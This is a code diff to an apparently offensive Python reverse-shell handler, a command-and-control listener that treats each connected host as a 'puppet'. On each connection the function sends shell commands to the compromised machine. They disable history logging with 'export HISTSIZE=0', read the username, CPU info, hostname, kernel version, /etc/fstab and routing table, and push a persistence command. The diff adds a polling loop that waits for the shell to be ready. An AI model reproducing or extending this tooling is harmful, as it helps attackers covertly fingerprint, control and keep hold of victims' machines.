@@ -70,21 +70,47 @@ async def handle_shell_init(reader, writer):
 
     init_data = bytes()
 
-    randomStringPrefix = randomString()
-    randomStringSuffix = randomString()
-    randomStringWhoamiPrefix = randomString()
-    randomStringWhoamiSuffix = randomString()
-    randomStringCPUinfoPrefix = randomString()
-    randomStringCPUinfoSuffix = randomString()
+    randomStringInitSuffix     = randomString()
+    randomStringHashPrefix     = randomString()
+    randomStringHashSuffix     = randomString()
+    randomStringWhoamiPrefix   = randomString()
+    randomStringWhoamiSuffix   = randomString()
+    randomStringCPUinfoPrefix  = randomString()
+    randomStringCPUinfoSuffix  = randomString()
     randomStringHostnamePrefix = randomString()
-    randomStringHostnameSuffix = randomString()
-    randomStringInitEndSuffix = randomString()
+    randomStringHostnameSuffix = randomString()    
+
+    while True:
+        try:
+            randomStringInitPrefix = randomString()
+            writer.write( "echo {}\n".format(randomStringInitPrefix).encode() )
+            await writer.drain()
+            await asyncio.sleep(4)
+
+            data = await asyncio.wait_for( reader.read(40960), timeout=10 )
+
+            init_data += data
+            if randomStringInitPrefix in data.decode().replace(f"echo {randomStringInitPrefix}", ""):
+                break
+
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
+
+        except KeyboardInterrupt:
+            print("Ctrl + C")
+
+        except Exception as e :
+            print(traceback.format_exc())
+            writer.close()
+            return None
+    
     init_command = str()
     init_command += "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
     init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && (hostname||cat /etc/hostname) && echo {randomStringHostnameSuffix}\n"
-    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
+    init_command += f"echo {randomStringHashPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringHashSuffix}\n"
     writer.write( init_command.encode() )
     await writer.drain()
 
@@ -93,7 +119,7 @@ async def handle_shell_init(reader, writer):
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
         await writer.drain()
 
-    writer.write( f"echo {randomStringInitEndSuffix}\n".encode() )
+    writer.write( f"echo {randomStringInitSuffix}\n".encode() )
     await writer.drain()
 
     while True:
@@ -101,12 +127,12 @@ async def handle_shell_init(reader, writer):
             data = await asyncio.wait_for( reader.read(40960), timeout=10 )
             init_data += data
 
-            if randomStringInitEndSuffix in data.decode().replace(f"echo {randomStringInitEndSuffix}", ""):
+            if randomStringInitSuffix in data.decode().replace(f"echo {randomStringInitSuffix}", ""):
                 # getTextBetweenStrings()未匹配到则返回<unknown>,若hostname或uesrname中包含也返回<unknown>
                 puppetHash = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringPrefix}", "").replace(f"echo {randomStringSuffix}", ""),
-                        randomStringPrefix,
-                        randomStringSuffix
+                        init_data.decode().replace(f"echo {randomStringHashPrefix}", "").replace(f"echo {randomStringHashSuffix}", ""),
+                        randomStringHashPrefix,
+                        randomStringHashSuffix
                         ).strip()
 
                 username = getTextBetweenStrings(
